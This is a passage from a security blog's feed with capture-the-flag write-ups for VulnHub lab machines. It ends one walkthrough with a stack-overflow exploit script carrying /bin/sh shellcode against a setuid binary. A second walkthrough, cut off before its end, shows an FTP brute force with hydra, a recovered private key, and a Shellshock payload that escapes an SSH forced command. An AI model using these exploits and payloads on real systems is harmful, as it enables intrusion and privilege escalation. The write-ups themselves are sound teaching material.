              H)�Aotg�\!�E?�̀l+�B��$f5%�&amp;amp;�y�|S[I;R.�+T��w�$͟�7��?i�w&#39;�3�s&amp;lt;A��^��

root@kali:~# ./tfc test.tfc out.tfc
&amp;gt;&amp;gt; File crypted, goodbye!

root@kali:~# head out.tfc
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So to recap. We generated a file &lt;code&gt;test.tfc&lt;/code&gt;, which is the encrypted version of 1000 &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s. We then ran it through &lt;code&gt;tfc&lt;/code&gt; which decrypted it to our cleartext &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s again.&lt;/p&gt;

&lt;h2 id=&#34;finding-eip&#34;&gt;finding EIP&lt;/h2&gt;

&lt;p&gt;With the ability of generating encrypted files of any length now, we had everything we needed to find EIP from the previously suspected stack overflow. Worst case, we can have a clean buffer of &lt;code&gt;41&lt;/code&gt;&amp;rsquo;s to work with in a debugger. So the next run, I changed the content to 6000 &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s, and ran it through &lt;code&gt;gdb&lt;/code&gt; to be able to inspect the Segmentation Fault that occurs.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# python make-crypt.py &amp;gt; crash.tfc

root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc...(no debugging symbols found)...done.

gdb-peda$ r crash.tfc crash-out.tfc

Program received signal SIGSEGV, Segmentation fault.
[----------------------------------registers-----------------------------------]
EAX: 0x0
EBX: 0xb7fbfff4 --&amp;gt; 0x14bd7c
ECX: 0xffffffc8
EDX: 0x9 (&#39;\t&#39;)
ESI: 0x0
EDI: 0x0
EBP: 0x41414141 (&#39;AAAA&#39;)
ESP: 0xbffff3d0 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
EIP: 0x41414141 (&#39;AAAA&#39;)
EFLAGS: 0x10286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x41414141
[------------------------------------stack-------------------------------------]
0000| 0xbffff3d0 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0004| 0xbffff3d4 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0008| 0xbffff3d8 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0012| 0xbffff3dc (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0016| 0xbffff3e0 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0020| 0xbffff3e4 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0024| 0xbffff3e8 (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
0028| 0xbffff3ec (&#39;A&#39; &amp;lt;repeats 200 times&amp;gt;...)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x41414141 in ?? ()
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;BOOM!&lt;/strong&gt; A cleanly overwritten EIP! :) At this stage I was fairly confident the rest of the exploit was a plain and simple stack overflow. I proceeded to fire up &lt;code&gt;pattern_create&lt;/code&gt; from the Metasploit framework to generate me a unique string of 6000 characters. I then swapped out the content from my 6000 &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s to this pattern and rerun the crash in &lt;code&gt;gdb&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# python make-crypt.py &amp;gt; crash.tfc

root@kali:~# gdb -q ./tfc
Reading symbols from /root/tfc...(no debugging symbols found)...done.
gdb-peda$ r crash.tfc crash-out.tfc

[... snip ...]

Stopped reason: SIGSEGV
0x35684634 in ?? ()
gdb-peda$
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the crash at &lt;code&gt;0x35684634&lt;/code&gt;, we check up with &lt;code&gt;pattern_offset&lt;/code&gt; to see where exactly in that 6000 character buffer this pattern occurs:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# /usr/share/metasploit-framework/tools/pattern_offset.rb 35684634
[*] Exact match at offset 4124
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This means EIP starts at byte 4124 of evil buffer. So back I went to our file generation script and changed the payload to send 4124 &lt;em&gt;A&lt;/em&gt;&amp;rsquo;s and then 4 &lt;em&gt;B&lt;/em&gt;&amp;rsquo;s, and padded the rest with &lt;em&gt;C&lt;/em&gt;&amp;rsquo;s up to 6000 characters.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;content = &amp;quot;A&amp;quot; *4124 + &amp;quot;BBBB&amp;quot; + &amp;quot;C&amp;quot;*(6000-4124-4)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This resulted in a crash at &lt;code&gt;0x42424242&lt;/code&gt; in &lt;code&gt;gdb&lt;/code&gt; which was perfect!&lt;/p&gt;

&lt;h2 id=&#34;exploiting-tfc&#34;&gt;exploiting tfc&lt;/h2&gt;

&lt;p&gt;The only thing that was left to do was to find a &lt;code&gt;JMP ESP&lt;/code&gt; instruction we could jump to, and add some shell code on to the stack. Since the binary compiled with &lt;code&gt;NO NX&lt;/code&gt;, it should happily execute code on it.&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/knock_knock_jmp_esp.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;Using Evans Debugger (run with &lt;code&gt;edb --run ./tfc&lt;/code&gt;), I searched for a &lt;em&gt;JMP ESP&lt;/em&gt; instruction and found one in &lt;code&gt;tfc&lt;/code&gt; itself at &lt;code&gt;0x08048e93&lt;/code&gt;. This is where we will tell EIP to point to when we corrupt the memory. That means our contents will change to:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;content = &amp;quot;A&amp;quot; *4124 + &amp;quot;\x93\x8e\x04\x08&amp;quot; + &amp;quot;C&amp;quot;*(6000-4124-4)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Lastly, we need some shell code. I just re-used some &lt;code&gt;/bin/sh&lt;/code&gt; shell code I have stashed away for this one, and added it to the buffer after a few NOP&amp;rsquo;s just in case. Normally one would have to actually first check for any bad characters that may cause our shellcode to break when sent via the buffer. I skipped this and was lucky to have a working one first try. The final exploit therefore has the following section to prepare the contents:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;if __name__ == &#39;__main__&#39;:

    # 08048e93  ; jmp esp
    shellcode = (
        &amp;quot;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2\x52\x68\x6e\x2f\x73\x68&amp;quot; +
        &amp;quot;\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&amp;quot;
    )

    content = &amp;quot;A&amp;quot; *4124 + &amp;quot;\x93\x8e\x04\x08&amp;quot; + &amp;quot;\x90&amp;quot;*16 + shellcode + &amp;quot;C&amp;quot; *(6000-4124-4-16-len(shellcode))
    length = len(content)

    encrypted = xcrypt(content, length)
    print encrypted
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;With the contents prepared, we would then run it outside of a debugger to test and get dropped into a shell. That concluded the testing and the script was ready for use on the VM. So, I copied the python over to &lt;code&gt;jason&lt;/code&gt;&amp;rsquo;s home directory and executed it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;jason@knockknock:~$ python make-crypt.py &amp;gt; crash.tfc &amp;amp;&amp;amp; ./tfc crash.tfc crash-out.tfc
# id
uid=0(root) gid=1000(jason) groups=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),1000(jason)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;pwnd!&lt;/p&gt;

&lt;p&gt;As proof, the flag:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;# cat /root/the_flag_is_in_here/qQcmDWKM5a6a3wyT.txt
 __                         __              __                         __      ____
|  | __ ____   ____   ____ |  | __         |  | __ ____   ____   ____ |  | __ /_   |
|  |/ //    \ /  _ \_/ ___\|  |/ /  ______ |  |/ //    \ /  _ \_/ ___\|  |/ /  |   |
|    &amp;lt;|   |  (  &amp;lt;_&amp;gt; )  \___|    &amp;lt;  /_____/ |    &amp;lt;|   |  (  &amp;lt;_&amp;gt; )  \___|    &amp;lt;   |   |
|__|_ \___|  /\____/ \___  &amp;gt;__|_ \         |__|_ \___|  /\____/ \___  &amp;gt;__|_ \  |___|
     \/    \/            \/     \/              \/    \/            \/     \/

Hooray you got the flag!

Hope you had as much fun r00ting this as I did making it!

Feel free to hit me up in #vulnhub @ zer0w1re

Gotta give a big shout out to c0ne, who helpped to make the tfc binary challenge,
as well as rasta_mouse, and recrudesce for helping to find bugs and test the VM :)

root password is &amp;quot;qVx4UJ*zcUdc9#3C$Q&amp;quot;, but you should already have a shell, right? ;)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are a number other goodies in /root to check out so be sure to do that!&lt;/p&gt;

&lt;h2 id=&#34;conclusion&#34;&gt;conclusion&lt;/h2&gt;

&lt;p&gt;Big shoutout to &lt;a href=&#34;https://twitter.com/zer0w1re&#34;&gt;@zer0w1re&lt;/a&gt; for the VM and as always &lt;a href=&#34;https://twitter.com/vulnhub&#34;&gt;@VulnHub&lt;/a&gt; for the hosting. The learning experience has been invaluable! :)&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>another troll tamed solving troll 2</title>
      <link>https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/</link>
      <pubDate>Fri, 10 Oct 2014 17:32:35 +0000</pubDate>
      
      <guid>https://leonjza.github.io/blog/2014/10/10/another-troll-tamed-solving-troll-2/</guid>
      <description>

&lt;h2 id=&#34;foreword&#34;&gt;foreword&lt;/h2&gt;

&lt;p&gt;&lt;a href=&#34;https://www.vulnhub.com/entry/tr0ll-2,107/&#34;&gt;Tr0ll2&lt;/a&gt; is a successor in a boot2root series by &lt;a href=&#34;https://twitter.com/Maleus21&#34;&gt;@Maleus21&lt;/a&gt; hosted over at &lt;a href=&#34;http://vulnhub.com/&#34;&gt;VulnHub&lt;/a&gt;. Having been able to &lt;a href=&#34;https://leonjza.github.io/blog/2014/08/15/taming-the-troll/&#34;&gt;pwn Tr0ll1&lt;/a&gt;, I gave this one a shot too.&lt;/p&gt;

&lt;p&gt;Here is my experience taming the troll, again.&lt;/p&gt;

&lt;h2 id=&#34;getting-started&#34;&gt;getting started&lt;/h2&gt;

&lt;p&gt;Like almost all boot2roots, we get right into it by slapping the VM into a hypervisor (VirtualBox in my case), discovering the IP address and running a &lt;code&gt;nmap&lt;/code&gt; against it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/troll2# nmap -sV --reason 192.168.56.101

Starting Nmap 6.46 ( http://nmap.org ) at 2014-10-10 06:55 SAST
Nmap scan report for 192.168.56.101
Host is up, received reset (0.00031s latency).
Not shown: 997 filtered ports
Reason: 997 no-responses
PORT   STATE SERVICE REASON  VERSION
21/tcp open  ftp     syn-ack vsftpd 2.0.8 or later
22/tcp open  ssh     syn-ack OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack Apache httpd 2.2.22 ((Ubuntu))
Service Info: Host: Tr0ll; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.21 seconds
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;ftp, ssh and http. Quite an attack surface to start with. I start with a quick google for &lt;em&gt;vsftpd 2.0.8 exploit&lt;/em&gt; with nothing apparently obvious jumping out at me. I also quickly attempt to SSH to the server just to check if there aren&amp;rsquo;t any strange banners etc to be found which was not the case.&lt;/p&gt;

&lt;h2 id=&#34;web-server&#34;&gt;web server&lt;/h2&gt;

&lt;p&gt;Opening up a browser to &lt;a href=&#34;http://192.168.56.101&#34;&gt;http://192.168.56.101&lt;/a&gt; revealed a familiar image:&lt;/p&gt;

&lt;p&gt;
&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll2_web.png&#34; /&gt;
    
    
&lt;/figure&gt;

Oh. Hai. The sources serving up the image had the comment &lt;code&gt;&amp;lt;!-- Nothing to see here, but good try NOOB!&amp;gt;&lt;/code&gt; with the image.&lt;/p&gt;

&lt;p&gt;Further poking around got me to checking if a robots.txt file was present. It was and contained some interestingly named entries. Some of the directories would 404, however a few would 200 with exactly the same content. The directories that returned HTTP 200 were:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;/keep_trying
/dont_bother
/noob
/ok_this_is_it
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The content served up at these URLs:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll2_noob.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;The source that serves up this image had the comment &lt;code&gt;&amp;lt;!--What did you really think to find here? Try Harder!&amp;gt;&lt;/code&gt; with the image.&lt;/p&gt;

&lt;p&gt;So with exactly the same content displayed for all of the directories that are present, I was a little unsure of where to go next. For all I knew, these 4 directories may have been a symlink to the same place. The HTML sources were the same as well as the images. I figured the next thing I could do was download the images and compare exifdata. I put the URL&amp;rsquo;s that would 200 into a text file from the &lt;code&gt;robots.txt&lt;/code&gt; and looped over them downloading the images:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# for line in $(cat 200.txt); do echo &amp;quot;==&amp;gt;$line&amp;lt;==&amp;quot; &amp;amp;&amp;amp; wget 192.168.56.101/$line/cat_the_troll.jpg; done

==&amp;gt;/ok_this_is_it&amp;lt;==
--2014-10-10 07:31:37--  http://192.168.56.101/ok_this_is_it/cat_the_troll.jpg
Connecting to 192.168.56.101:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 15831 (15K) [image/jpeg]
Saving to: `cat_the_troll.jpg.3&#39;

100%[=======&amp;gt;] 15,831      --.-K/s   in 0s

2014-10-10 07:31:37 (191 MB/s) - `cat_the_troll.jpg.3&#39; saved [15831/15831]
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Immediately when you &lt;code&gt;ls&lt;/code&gt; the directory containing the images will you notice a difference:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ls -l
total 68
-rw-r--r-- 1 root root    47 Oct 10 07:31 200.txt
-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg
-rw-r--r-- 1 root root 15873 Oct  4 10:31 cat_the_troll.jpg.1 #&amp;lt;---
-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.2
-rw-r--r-- 1 root root 15831 Oct  4 10:57 cat_the_troll.jpg.3
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;One of the entires has a different timestamp to the others. A quick glance on the exifdata did not reveal any differences, however, running a &lt;code&gt;cmp&lt;/code&gt; on the files hinted towards what may be up.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# cmp cat_the_troll.jpg cat_the_troll.jpg.1
cmp: EOF on cat_the_troll.jpg
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sweet, so lets print the last line of both and check what the diff is:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg
8�z2��p�T�lj\p��?�&amp;lt;�S�۪��6�#���7U y���*/ p?E$���%=���.�B���o�ES_�

root@kali:~/Desktop/troll2/c# tail -n 1 cat_the_troll.jpg.1
8�z2��p�T�lj\p��?�&amp;lt;�S�۪��6�#���7U y���*/ p?E$���%=���.�B���o�ES_��Look Deep within y0ur_self for the answer
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;_Look Deep within y0ur&lt;em&gt;self for the answer&lt;/em&gt;. Hmm. Keeping in mind some of the previous tricks tr0ll had and the fact that the words _y0ur&lt;em&gt;self&lt;/em&gt; were written differently, I tried to use this as a web path:&lt;/p&gt;


&lt;figure &gt;
    
        &lt;img src=&#34;https://leonjza.github.io/images/troll2_y0ur_self.png&#34; /&gt;
    
    
&lt;/figure&gt;


&lt;p&gt;I downloaded &lt;code&gt;answer.txt&lt;/code&gt; and started to check what is happening inside:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# head answer.txt
QQo=
QQo=
QUEK
QUIK
QUJNCg==
QUMK
QUNUSAo=
QUkK
QUlEUwo=
QU0K
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Looks a lot like base64 hey? Lets try decode it:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# cat answer.txt | base64 -d | head
A
A
AA
AB
ABM
AC
ACTH
AI
AIDS
AM
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The resultant output appeared to be a wordlist. A big one too. In fact, it has &lt;strong&gt;99157&lt;/strong&gt; entires in it. At this stage I was really hoping that I did not have to use this to brute force the ftp or ssh service. That would take forever! After a &lt;code&gt;sort | uniq&lt;/code&gt;, the size was reduced to &lt;strong&gt;73128&lt;/strong&gt; which was still too much.&lt;/p&gt;

&lt;p&gt;I decided to scroll through the list to see if I can spot anything out of the ordinary. My eyes started to feel very tired and not in the mood to go through all of this, but I persisted and eventually noticed a entry &lt;strong&gt;ItCantReallyBeThisEasyRightLOL&lt;/strong&gt; on line 34164 that was not similar in pattern to the other words. This one was not a web directory :P&lt;/p&gt;

&lt;p&gt;My guess was that this has to be a password for either the FTP or SSH service.&lt;/p&gt;

&lt;h2 id=&#34;ftpee&#34;&gt;ftpee&lt;/h2&gt;

&lt;p&gt;I now had what I assumed was a password. No other web related hints had me focussing there and I started to doubt my findings.&lt;/p&gt;

&lt;p&gt;As a last resort, I started to get together a wordlist that I could give to hydra to chew on. My idea was to grab all of the strings from the web service, including the one found in &lt;code&gt;answer.txt&lt;/code&gt;, mutate it a bit and hand it over to hydra to do its work.&lt;/p&gt;

&lt;p&gt;My approach to compiling the list basically boiled down to appending everything I could find (including HTML sources) as strings into a file. Once I had that, I ran &lt;code&gt;cat wordz |  tr &amp;quot;\&amp;quot;&#39; &amp;quot; &#39;\n&#39; | sort -u &amp;gt;&amp;gt; words&lt;/code&gt; to break it up into a wordlist. Lastly I took the entries had a &lt;code&gt;_&lt;/code&gt; in them and broke them up as single words ie: &lt;code&gt;cat_the_troll.jpg&lt;/code&gt; turned into &lt;code&gt;cat&lt;/code&gt;, &lt;code&gt;the&lt;/code&gt;, &lt;code&gt;troll&lt;/code&gt;. The resultant list can be seen &lt;a href=&#34;https://gist.github.com/leonjza/db5cc19cd62b270a89db&#34;&gt;here&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And finally, it was time to let hydra on the loose.&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;root@kali:~# hydra -v -V -F -L words -P words -t 30 ftp://192.168.56.101
Hydra v7.6 (c)2013 by van Hauser/THC &amp;amp; David Maciejak - for legal purposes only

Hydra (http://www.thc.org/thc-hydra) starting at 2014-10-10 08:11:50
[DATA] 30 tasks, 1 server, 13689 login tries (l:117/p:117), ~456 tries per task
[DATA] attacking service ftp on port 21
[VERBOSE] Resolving addresses ... done
[ATTEMPT] target 192.168.56.101 - login &amp;quot;&amp;gt;&amp;quot; - pass &amp;quot;&amp;gt;&amp;quot; - 1 of 13689 [child 0]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;&amp;gt;&amp;quot; - pass &amp;quot;404&amp;quot; - 2 of 13689 [child 1]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;&amp;gt;&amp;quot; - pass &amp;quot;again&amp;quot; - 3 of 13689 [child 2]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;&amp;gt;&amp;quot; - pass &amp;quot;agent&amp;quot; - 4 of 13689 [child 3]
[...]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;Tr0ll&amp;quot; - pass &amp;quot;Tr0ll&amp;quot; - 10621 of 13689 [child 4]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;Tr0ll&amp;quot; - pass &amp;quot;tr0ll2&amp;quot; - 10622 of 13689 [child 8]
[ATTEMPT] target 192.168.56.101 - login &amp;quot;Tr0ll&amp;quot; - pass &amp;quot;tr0ll_again.jpg&amp;quot; - 10623 of 13689 [child 23]
[21][ftp] host: 192.168.56.101   login: Tr0ll   password: Tr0ll
[STATUS] attack finished for 192.168.56.101 (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (http://www.thc.org/thc-hydra) finished at 2014-10-10 08:29:08
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After a really, really long time, we finally get a successful combination of &lt;code&gt;Tr0ll:Tr0ll&lt;/code&gt;. Guess I could have guessed that but oh well. Lets see if this gives us any access:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ftp 192.168.56.101
Connected to 192.168.56.101.
220 Welcome to Tr0ll FTP... Only noobs stay for a while...
Name (192.168.56.101:root): Tr0ll
331 Please specify the password.
Password:
230 Login successful.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Yay! Progress! Lets take a closer look&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;Remote system type is UNIX.
Using binary mode to transfer files.
ftp&amp;gt; pas
Passive mode on.

ftp&amp;gt; ls
227 Entering Passive Mode (192,168,56,101,73,4)
150 Here comes the directory listing.
-rw-r--r--    1 0        0            1474 Oct 04 01:09 lmao.zip
226 Directory send OK.

ftp&amp;gt; get lmao.zip
local: lmao.zip remote: lmao.zip
227 Entering Passive Mode (192,168,56,101,105,73)
150 Opening BINARY mode data connection for lmao.zip (1474 bytes).
226 Transfer complete.
1474 bytes received in 0.00 secs (621.0 kB/s)

ftp&amp;gt; bye
221 Goodbye.
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;noob-key&#34;&gt;noob key&lt;/h2&gt;

&lt;p&gt;We find ourselves with a zip archive called &lt;code&gt;lmao.zip&lt;/code&gt;. A encrypted one :(&lt;/p&gt;

&lt;p&gt;I tried a few passwords from the wordlist that I had built earlier and eventually got to the word we got out of &lt;code&gt;answer.txt&lt;/code&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/troll2# unzip lmao.zip
Archive:  lmao.zip
[lmao.zip] noob password: #ItCantReallyBeThisEasyRightLOL
  inflating: noob

root@kali:~# cat noob
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEAsIthv5CzMo5v663EMpilasuBIFMiftzsr+w+UFe9yFhAoLqq
yDSPjrmPsyFePcpHmwWEdeR5AWIv/RmGZh0Q+Qh6vSPswix7//SnX/QHvh0CGhf1
/9zwtJSMely5oCGOujMLjDZjryu1PKxET1CcUpiylr2kgD/fy11Th33KwmcsgnPo
q+pMbCh86IzNBEXrBdkYCn222djBaq+mEjvfqIXWQYBlZ3HNZ4LVtG+5in9bvkU5
z+13lsTpA9px6YIbyrPMMFzcOrxNdpTY86ozw02+MmFaYfMxyj2GbLej0+qniwKy
e5SsF+eNBRKdqvSYtsVE11SwQmF4imdJO0buvQIDAQABAoIBAA8ltlpQWP+yduna
u+W3cSHrmgWi/Ge0Ht6tP193V8IzyD/CJFsPH24Yf7rX1xUoIOKtI4NV+gfjW8i0
gvKJ9eXYE2fdCDhUxsLcQ+wYrP1j0cVZXvL4CvMDd9Yb1JVnq65QKOJ73CuwbVlq
UmYXvYHcth324YFbeaEiPcN3SIlLWms0pdA71Lc8kYKfgUK8UQ9Q3u58Ehlxv079
La35u5VH7GSKeey72655A+t6d1ZrrnjaRXmaec/j3Kvse2GrXJFhZ2IEDAfa0GXR
xgl4PyN8O0L+TgBNI/5nnTSQqbjUiu+aOoRCs0856EEpfnGte41AppO99hdPTAKP
aq/r7+UCgYEA17OaQ69KGRdvNRNvRo4abtiKVFSSqCKMasiL6aZ8NIqNfIVTMtTW
K+WPmz657n1oapaPfkiMRhXBCLjR7HHLeP5RaDQtOrNBfPSi7AlTPrRxDPQUxyxx
n48iIflln6u85KYEjQbHHkA3MdJBX2yYFp/w6pYtKfp15BDA8s4v9HMCgYEA0YcB
TEJvcW1XUT93ZsN+lOo/xlXDsf+9Njrci+G8l7jJEAFWptb/9ELc8phiZUHa2dIh
WBpYEanp2r+fKEQwLtoihstceSamdrLsskPhA4xF3zc3c1ubJOUfsJBfbwhX1tQv
ibsKq9kucenZOnT/WU8L51Ni5lTJa4HTQwQe9A8CgYEAidHV1T1g6NtSUOVUCg6t
0PlGmU9YTVmVwnzU+LtJTQDiGhfN6wKWvYF12kmf30P9vWzpzlRoXDd2GS6N4rdq
vKoyNZRw+bqjM0XT+2CR8dS1DwO9au14w+xecLq7NeQzUxzId5tHCosZORoQbvoh
ywLymdDOlq3TOZ+CySD4/wUCgYEAr/ybRHhQro7OVnneSjxNp7qRUn9a3bkWLeSG
th8mjrEwf/b/1yai2YEHn+QKUU5dCbOLOjr2We/Dcm6cue98IP4rHdjVlRS3oN9s
G9cTui0pyvDP7F63Eug4E89PuSziyphyTVcDAZBriFaIlKcMivDv6J6LZTc17sye
q51celUCgYAKE153nmgLIZjw6+FQcGYUl5FGfStUY05sOh8kxwBBGHW4/fC77+NO
vW6CYeE+bA2AQmiIGj5CqlNyecZ08j4Ot/W3IiRlkobhO07p3nj601d+OgTjjgKG
zp8XZNG8Xwnd5K59AVXZeiLe2LGeYbUKGbHyKE3wEVTTEmgaxF4D1g==
-----END RSA PRIVATE KEY-----
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;A unencrypted private key! Called &lt;code&gt;noob&lt;/code&gt;. I guessed &lt;code&gt;noob&lt;/code&gt; may be the username, so I fixed up the permissions on the key and tried my luck:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~/Desktop/troll2# chmod 600 noob
root@kali:~/Desktop/troll2# ssh noob@192.168.56.101 -i noob
TRY HARDER LOL!
Connection to 192.168.56.101 closed.
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;shocking-isn-t-it&#34;&gt;shocking isn&amp;rsquo;t it&lt;/h2&gt;

&lt;p&gt;Surprise surprise. It seemed like we are in fact authenticating, but we don&amp;rsquo;t have a shell. I figured one of two things could be happening here. First, the &lt;code&gt;.bashrc&lt;/code&gt; may have been modified with something that echoes the text &lt;code&gt;TRY HARDER LOL!&lt;/code&gt; and exits, or there is some restriction on the SSH key for &lt;code&gt;noob&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;My first attempts were to specify a command with &lt;code&gt;-t&lt;/code&gt; as &lt;code&gt;/bin/bash&lt;/code&gt;, but this did not work.&lt;/p&gt;

&lt;p&gt;With the current buzz around the recently disclosed &lt;em&gt;shellshock&lt;/em&gt; bug, I thought I&amp;rsquo;d try it assuming its a key restriction:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;root@kali:~# ssh noob@192.168.56.101 -i noob -t &#39;() { :;}; /bin/bash&#39;
noob@Tr0ll2:~$ id
uid=1002(noob) gid=1002(noob) groups=1002(noob)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Shocking :) To confirm, the &lt;code&gt;authorized_keys&lt;/code&gt; file has the entry &lt;code&gt;command=&amp;quot;echo TRY HARDER LOL!&amp;quot;&lt;/code&gt; before the public key.&lt;/p&gt;

&lt;h2 id=&#34;which-door-leads-to-r00t&#34;&gt;which door leads to r00t&lt;/h2&gt;

&lt;p&gt;With shell access to the machine, it was time to start enumerating and learn more about what we are facing next. Nothing particularly interesting popped up, until I noticed a directory &lt;code&gt;/nothing_to_see_here&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;/nothing_to_see_here&lt;/code&gt; had another directory inside of it &lt;code&gt;choose_wisely/&lt;/code&gt; with another 3 sub directories called &lt;code&gt;door1&lt;/code&gt;, &lt;code&gt;door2&lt;/code&gt; and &lt;code&gt;door3&lt;/code&gt;.&lt;/p&gt;

&lt;p&gt;All 3 &amp;lsquo;doors&amp;rsquo; had a setuid binary called &lt;code&gt;r00t&lt;/code&gt;. I ran the first one which had the output:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-bash&#34;&gt;noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door1$ ./r00t
Good job, stand by, executing root shell...
BUHAHAHA NOOB!
noob@Tr0ll2:/nothing_to_see_here/choose_wisely/door3$
Broadcast message from noob@Tr0ll2
    (/dev/pts/0) at 0:48 ...

